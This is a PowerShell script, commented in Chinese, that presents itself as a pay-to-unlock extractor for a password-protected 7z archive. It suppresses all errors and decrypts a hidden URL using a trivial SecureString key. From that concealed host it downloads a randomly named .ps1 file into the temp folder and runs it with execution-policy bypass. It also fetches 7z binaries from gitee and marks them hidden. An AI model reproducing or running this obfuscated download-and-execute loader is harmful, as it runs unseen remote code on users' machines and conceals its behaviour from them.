$WarningPreference = "SilentlyContinue"; $ErrorActionPreference = "SilentlyContinue"; [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12; $power = (1..16); function Decrypt-String { param ( [Parameter(Mandatory=$true)] [string]$EncryptedText, [Parameter(Mandatory=$true)] [byte[]]$Key ); $secureString = $EncryptedText | ConvertTo-SecureString -Key $Key; $plainText = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString)); return $plainText }

[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

function ExtractWith7z {
    param (
        [string]$fileName,
        [string]$passWord,
        [string]$exeUrl,
        [string]$dllUrl
    )

    $currentPath = Get-Location
    $exeFile = Join-Path $currentPath "7z.exe"
    $dllFile = Join-Path $currentPath "7z.dll"
    $fileToExtract = Join-Path $currentPath $fileName

    # 下载 7z.exe 和 7z.dll
    Invoke-WebRequest -Uri $exeUrl -OutFile $exeFile
    $exeExists = Test-Path $exeFile; attrib +h $exeFile
    Invoke-WebRequest -Uri $dllUrl -OutFile $dllFile
    $dllExists = Test-Path $dllFile; attrib +h $dllFile

    if ($exeExists -and $dllExists) {

        # 解压命令
$tempLogo = [System.IO.Path]::GetTempFileName()
$tempLoge = [System.IO.Path]::GetTempFileName()

        $arguments = "x", $fileToExtract, "-p$passWord", "-o$currentPath", "-y"
        $process = Start-Process -FilePath $exeFile -ArgumentList $arguments -NoNewWindow -PassThru -Wait -RedirectStandardOutput $tempLogo -RedirectStandardError $tempLoge

        # 检查解压结果
        if ($process.ExitCode -eq 0) {
            Write-Output "解压完成。"
        } else {
            Write-Output "解压失败，请检查 error.log 文件以获取更多信息。"
        }

        # 删除临时文件
Remove-Item $exeFile, $dllFile, $tempLogo, $tempLoge -Force

    } else {
        Write-Output "下载失败或文件不完整，请检查网络连接。"
    }
}
$shell = "76492d1116743f0423413b16050a5345MgB8AG8ALwB3AHEAVgBRAEgAYgBrAC8AdwBLAG8AZwBqAHMAcABNAHcAdABFAEEAPQA9AHwANQA0AGUANAAzAGIAOABjAGQANABmAGMAMwBlADcANQBjAGEAOAAyADcANQAyAGYAZgBiADMAZABiAGIANAA3ADkAMQBhAGQAMwBiADIAMAA4ADcANQA4ADAAMgBlADgAOAAyADYAZgAwADYANgA2AGQAZgBiADAAYgA4AGIAOAA0ADcAMQAzAGMAZABjADgAZABjADkAOAA1ADAAOQBlAGIAMAA5ADQAMwA2AGYAMQAxAGYAYwBiADcAMwBkADgAZgBmAGMANwA0ADAAOAAxAGYAMwA2AGQANQBiAGYAOABkAGEAYgBiADYANQBkADIAMABkAGEAMAA5ADAAMgBlAGIAZAA1ADkAOAAwADQAYwAwADQAZQBmADAAMwBiADQAOQAyAGQAMwAwADgANAA0AGQANAA2ADQANQA2AGUAMQA2ADMAYgAzAGQAYwBkADEAZQAzADEANQBmADYANQBjADEAMwAzADUAYgA0AGIANQAzADgAZQA5ADQAYgA1AGUAMQAyADUANABjADEAMQBjADQANQA3ADYAMAA3ADcAYQA4AGEAZQBhADMANAA1AGYANAA1AGMANQA0AGUAYgBkAGMANQBlADEAZQBlADEAMAA5AGQAZQA3ADEAMQBiAGIAOQA0ADIAYwAzADgAZABhAGQAMgAxADkAOQA3AGYAYQA="
$DonateCheck = Decrypt-String -EncryptedText $shell -Key $power;







$passWord = "88888888"
# 定义下载链接
$exeUrl = "https://gitee.com/dylanbai8/download/releases/download/27.77/7z.exe"
$dllUrl = "https://gitee.com/dylanbai8/download/releases/download/27.77/7z.dll"






Write-Host ".`n..`n..."
Write-Host "加载中，请等待 ..."


# 查找所有符合条件的文件
$currentPath = Get-Location
$files = Get-ChildItem -Path $currentPath -Filter *.7z.001

# 检查文件数
if ($files.Count -eq 1) {
    # 如果文件数为1，将文件名赋值给变量
    $fileName = $files.Name
    Write-Output "找到的文件: $fileName"

# 去除后缀
$fileNum = $fileName -replace "\.7z\.001$", ""

# 判断是否为13位纯数字
if ($fileNum -match "^\d{13}$") {
    Write-Output "$fileNum 是13位纯数字"


# 检测订单空闲
$response_state = Invoke-WebRequest -Uri ${DonateCheck}?state=lock; $state = $response_state.Content.Trim(); if ($state -ne "unlocked") {Write-Host "排队中，请稍后2分钟再试 ..."; Write-Host "...`n..`n."; return}

# 锁定订单号
$response_pay = Invoke-WebRequest -Uri $DonateCheck; $pay = $response_pay.Content.Trim();

# 准备弹框文件
$FileURA0 = [System.IO.Path]::GetRandomFileName() + ".ps1";
Invoke-WebRequest -Uri ${DonateCheck}?state=fileurc0 -OutFile "$Env:temp\donate300.png"; Invoke-WebRequest -Uri ${DonateCheck}?state=fileurd0 -OutFile "$Env:temp\$FileURA0";

# 弹框收款
Write-Host "准备完成，扫描弹框二维码打赏后继续 ..."; powershell -ExecutionPolicy Bypass -File "$Env:temp\$FileURA0"; $response_ispay = Invoke-WebRequest -Uri $DonateCheck; $ispay = $response_ispay.Content.Trim()

# 判断收款成功 执行任务
if ($pay -eq $ispay) {$UrlTest = Invoke-WebRequest -Uri ${DonateCheck}?state=unlock; Write-Host "错误，未检测到打赏 (未付款、支付超时)。请稍后再试 ..."} else {$UrlTest = Invoke-WebRequest -Uri ${DonateCheck}?state=unlock; Write-Host "感谢打赏！执行中，请稍等 (切勿中断脚本，以免订单失效) ..."; ExtractWith7z -fileName $fileName -passWord $passWord -exeUrl $exeUrl -dllUrl $dllUrl}




} else {
    Write-Output "$fileNum 不是13位纯数字"
}


} else {
    # 如果文件数不为1，则报错
    Write-Output "错误: 找到的文件数为 $($files.Count)，应为1个"
}

